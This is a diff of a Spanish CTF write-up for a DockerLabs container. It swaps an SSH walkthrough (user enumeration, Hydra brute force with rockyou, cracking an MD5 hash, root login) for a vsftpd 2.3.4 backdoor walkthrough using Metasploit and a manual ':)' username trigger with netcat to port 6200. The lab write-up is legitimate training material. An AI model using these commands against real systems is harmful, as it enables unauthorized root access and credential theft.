@@ -87,215 +87,117 @@ Al igual que antes, para que la visualización de toda la información sea más 
   11   │ # Nmap done at Thu Sep 11 11:23:33 2025 -- 1 IP address (1 host up) scanned in 15.88 seconds
 ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
-Como la versión del servicio OpenSSH es menor o igual a la 7.7 sabemos que puede haber vulnerabilidades conocidas. Esto es algo que acabas aprendiendo de memoria pero, si queremos comprobarlo podemos hacer uso de la herramienta [searchsploit](https://github.com/topics/searchsploit) para ver si presenta o no alguna vulnerabilidad.
+Como podemos observar nos encontramos ante un servicio FTP con una versión vsftp 2.3.4.  Como en lo personal no tengo mucho conocimiento sobre de las versiones de FTP, vamos a pasarlo por [SearchSploit](https://github.com/topics/searchsploit) para ver si hay alguna vulnerabilidad conocida.
 ```ruby
-❯ searchsploit OpenSSH 7.7
+❯ searchsploit "vsftpd 2.3.4"
 ----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                             |  Path
 ----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                   | linux/remote/45233.py
-OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                             | linux/remote/45210.py
-OpenSSH < 7.7 - User Enumeration (2)                                                                                                                       | linux/remote/45939.py
+vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                  | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                     | unix/remote/17491.rb
 ----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 ```
-Podemos observar que, efectivamente, hay un par de vulnerabilidades conocidas.  Aquí puedes tomar dos caminos.
-1. Utilizar alguna base de datos de CVEs para buscar algún script que poder ejecutar para explotarla.
-2. Utilizar metasploit.
+Como hay vulnerabilidades conocidas, vamos a usar [Metasploit Framework](https://github.com/rapid7/metasploit-framework) para su explotación.
 
 Yo decidí utilizar [metasploit](https://github.com/rapid7/metasploit-framework) en este caso añadiendo el parámetro -q para evitar el banner de inicio de la herramienta y así ganar más tiempo.
 ```ruby
 ❯ msfconsole -q
-msf > use auxiliary/scanner/ssh/ssh_enumusers
-[*] Setting default action Malformed Packet - view all 2 actions with the show actions command
-msf auxiliary(scanner/ssh/ssh_enumusers) > show options 
+msf > search vsftpd 2.3.4
 
-Module options (auxiliary/scanner/ssh/ssh_enumusers):
+Matching Modules
+================
 
-   Name          Current Setting  Required  Description
-   ----          ---------------  --------  -----------
-   CHECK_FALSE   true             no        Check for false positives (random username)
-   DB_ALL_USERS  false            no        Add all users in the current database to the list
-   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, http, sapni, socks4
-   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT         22               yes       The target port
-   THREADS       1                yes       The number of concurrent threads (max one per host)
-   THRESHOLD     10               yes       Amount of seconds needed before a user is considered found (timing attack only)
-   USERNAME                       no        Single username to test (username spray)
-   USER_FILE                      no        File containing usernames, one per line
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
 
 
-Auxiliary action:
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
 
-   Name              Description
-   ----              -----------
-   Malformed Packet  Use a malformed packet
+msf > use 0
+[*] No payload configured, defaulting to cmd/unix/interact
+msf exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, http, sapni, socks4
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
 
 
 
 View the full module info with the info, or info -d command.
 
-msf auxiliary(scanner/ssh/ssh_enumusers) > set RHOST 172.17.0.2
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 172.17.0.2
 RHOST => 172.17.0.2
-msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
-USER_FILE => /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
-msf auxiliary(scanner/ssh/ssh_enumusers) > run
-[*] 172.17.0.2:22 - SSH - Using malformed packet technique
-[*] 172.17.0.2:22 - SSH - Checking for false positives
-[*] 172.17.0.2:22 - SSH - Starting scan
-[+] 172.17.0.2:22 - SSH - User 'mail' found
-[+] 172.17.0.2:22 - SSH - User 'root' found
-[+] 172.17.0.2:22 - SSH - User 'news' found
-[+] 172.17.0.2:22 - SSH - User 'man' found
-[+] 172.17.0.2:22 - SSH - User 'bin' found
-[+] 172.17.0.2:22 - SSH - User 'games' found
-[+] 172.17.0.2:22 - SSH - User 'nobody' found
-[+] 172.17.0.2:22 - SSH - User 'lovely' found
-[+] 172.17.0.2:22 - SSH - User 'backup' found
-[+] 172.17.0.2:22 - SSH - User 'daemon' found
-[+] 172.17.0.2:22 - SSH - User 'proxy' found
-[+] 172.17.0.2:22 - SSH - User 'list' found
-[+] 172.17.0.2:22 - SSH - User 'sys' found
-[+] Scanned 1 of 1 hosts (100% complete)
-[+] Auxiliary module execution completed
-```
-Una vez acabada la ejecución podemos observar el posible usuario de sistema, *lovely*.  Para comprobar si estamos en lo cierto, haremos uso de la herramienta de fuerza bruta [Hydra](https://github.com/vanhauser-thc/thc-hydra) utilizando *lovely* como nombre de usuario y el diccionario [rockyou](https://github.com/topics/rockyou-wordlist) para comprobar contraseñas.
-```py
-❯ hydra -l lovely -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run
+[*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 172.17.0.2:21 - USER: 331 Please specify the password.
+[+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
+[+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (172.17.0.1:33483 -> 172.17.0.2:6200) at 2025-09-11 11:34:10 +0200
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 16:48:53
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
-[DATA] attacking ssh://172.17.0.2:22/
-[22][ssh] host: 172.17.0.2   login: lovely   password: rockyou
-1 of 1 target successfully completed, 1 valid password found
-[WARNING] Writing restore file because 1 final worker threads did not complete until end.
-[ERROR] 1 target did not resolve or could not be connected
-[ERROR] 0 target did not complete
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 16:49:05
-```
-* Con -l seleccionamos el usuario.
-* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
-* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.
-
-Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *lovely*.
-Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
-```ruby
-❯ ssh lovely@172.17.0.2
-lovely@172.17.0.2's password: 
-Linux 99ebdb36daec 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
-lovely@90f44a27e698:~$ whoami
-lovely
-``` 
-
-Para continuar, vamos a intentar listar todos los privilegios de *sudo* del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo.
-```ruby
-lovely@90f44a27e698:~$ sudo -l
--bash: sudo: command not found
-```
-Vemos que nos ha devuelto que el comando *sudo* no se ha encontrado así que no listaremos permisos de sudoers.  Esto puede ser por:
-* El sistema está minimalista (por ejemplo, contenedores, sistemas de pruebas, o ciertos servidores SSH).
-* Tu usuario no tiene permisos para sudo, o sudo no está instalado.
-
-La siguiente opción es buscar permisos SUID.  El SUID (Set User ID) es un bit especial de permisos en sistemas tipo Unix/Linux que se aplica a archivos ejecutables. Su función principal es permitir que un programa se ejecute con los permisos del propietario del archivo, en lugar de los permisos del usuario que lo ejecuta. Esto puede ser útil para ciertas tareas que requieren privilegios elevados, sin dar acceso completo al usuario.  Para ello ejecutaremos: 
-```ruby 
-lovely@90f44a27e698:~$ find / -type f -perm -4000 2>/dev/null
-/usr/local/libexec/ssh-keysign
-/usr/bin/chsh
-/usr/bin/gpasswd
-/usr/bin/newgrp
-/usr/bin/chfn
-/usr/bin/passwd
-/bin/su
-/bin/umount
-/bin/ping
-/bin/mount 
-```
-* Con find buscamos archivos y directorios en Linux.
-* Con / indicamos desde la raíz del sistema (es decir, busca en todo el sistema de archivos).
-* Con -type filtramos el tipo de archivo que queremos encontrar.
-* f significa *file* (archivo regular).
-* Con -perm filtramos por permisos específicos.
-* El bit 4000 corresponde al bit SUID:
-  * 4000 indica “ejecutar con los permisos del propietario”.
-  * El - antes de 4000 significa que cualquier archivo que tenga este bit SUID activado será incluido, aunque tenga otros permisos también.
-* Con 2>/dev/null conseguimos que la salida solo muestre los archivos válidos y no los errores.
-  * 2 es el descriptor de error (stderr).
-  * /dev/null es un archivo especial en Linux que descarta todo lo que se escriba en él.
-
-En esta salida podemos ver que no encontramos ningún binario que nos pueda proporcionar un escalado de privilegios de forma sencilla, por lo que decido investigar por el sistema a ver si hay algún archivo o directorio que pueda contener algo de información. 
-```ruby
-lovely@90f44a27e698:~$ pwd
-/home/lovely
-lovely@90f44a27e698:~$ ls -a
-.  ..  .bash_logout  .bashrc  .profile
-lovely@90f44a27e698:~$ cd ../..
-lovely@90f44a27e698:/$ ls -a
-.  ..  .dockerenv  bin  boot  dev  docker-entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
-lovely@90f44a27e698:/$ ls -a /opt
-.  ..  .hash
-lovely@90f44a27e698:/$ cat opt/.hash
-aa87ddc5b4c24406d26ddad771ef44b0
-```
-Trasteando un poco nos encontramos con un fichero oculto llamado *.hash*, el cual, si lo inspeccionamos, contendrá lo que parece un hash.  Lo copiamos y nos dirigiremos a la web de [CarckStation](https://crackstation.net/) y descrackemos el hash.  Como resultado nos dará que es un hash hecho con un algoritmo md5 y oculta la palabra *estrella*. ![CrackStation](https://github.com/JavieRR13/WriteUps/blob/2be3675a25197e4f1ce663fb2091422907aa2746/DockerLabs/Muy%20f%C3%A1cil/BreackMySSH/Im%C3%A1genes/BMSSH_CrackStation.png)
-Ya con la contraseña guardada, utilizaremos [Hydra](https://github.com/vanhauser-thc/thc-hydra) pero esta vez para adivinar un posible usuario al que pertenezca dicha contraseña.  
-```ruby
-❯ hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p estrella -f ssh://172.17.0.2
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 21:37:13
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
-[DATA] attacking ssh://172.17.0.2:22/
-[22][ssh] host: 172.17.0.2   login: root   password: estrella
-[STATUS] attack finished for 172.17.0.2 (valid pair found)
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 21:37:25
-```
-* Con -L indicamos que el usuario se va a proporcionar por una lista.
-* Con -p inidcamos la password.
-* Con -f indicamos que finalice la ejecución una vez encuentre un parámetro válido.
-
-Este proceso nos ha dado como resultado que la contraseña *estrella* puede pertenecer al usuario *root*.  Así que lo probamos y...
-```ruby
-❯ ssh root@172.17.0.2
-root@172.17.0.2's password: 
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-root@90f44a27e698:~# whoami
+whoami
 root
+pwd
+/root/vsftpd-2.3.4
 ```
 🥳CONSEGUIDO, SOMOS ROOT🥳
 ____________________________________________________________________________________________
-Otra opcion válida pero mucho menos didáctica hubiera sido ejecutar [Hydra](https://github.com/vanhauser-thc/thc-hydra) directamente contra el usuario *root*, asumiendo que se llamaba así, sin necesidad de andar trasteando con el usuario *lovely*.
+ Otra opción hubiera sido ver la documentación acerca de esta vulnerabilidad.  Cuando la estudiamos de cerca vemos que hay una opción que, añadiendo ":)" al nombre de usuario se abre el puerto 6200 y con la herramienta [Netcat](https://github.com/tlmader/netcat) apuntando hacia ese puerto se nos devuleve una terminal.
 ```ruby
-❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+❯ ftp 172.17.0.2
+Connected to 172.17.0.2.
+220 (vsFTPd 2.3.4)
+Name (172.17.0.2:kali): yo:)         
+331 Please specify the password.
+Password: 
+^C
+421 Service not available, user interrupt. Connection closed.
+ftp: Login failed
+ftp> exit
+❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 12:03 CEST
+Initiating ARP Ping Scan at 12:03
+Scanning 172.17.0.2 [1 port]
+Completed ARP Ping Scan at 12:03, 0.06s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 12:03
+Scanning 172.17.0.2 [65535 ports]
+Discovered open port 21/tcp on 172.17.0.2
+Discovered open port 6200/tcp on 172.17.0.2
+Completed SYN Stealth Scan at 12:03, 0.90s elapsed (65535 total ports)
+Nmap scan report for 172.17.0.2
+Host is up, received arp-response (0.11s latency).
+Scanned at 2025-09-11 12:03:58 CEST for 1s
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE REASON
+21/tcp   open  ftp     syn-ack ttl 64
+6200/tcp open  lm-x    syn-ack ttl 64
+MAC Address: 02:42:AC:11:00:02 (Unknown)
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 21:48:26
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
-[DATA] attacking ssh://172.17.0.2:22/
-[22][ssh] host: 172.17.0.2   login: root   password: estrella
-1 of 1 target successfully completed, 1 valid password found
-[WARNING] Writing restore file because 1 final worker threads did not complete until end.
-[ERROR] 1 target did not resolve or could not be connected
-[ERROR] 0 target did not complete
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 21:48:28
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds
+           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+```
+```ruby
+❯ nc 172.17.0.2 6200
+pwd
+/root/vsftpd-2.3.4
+whoami
+root
 ```
 
+🥳CONSEGUIDO, SOMOS ROOT🥳
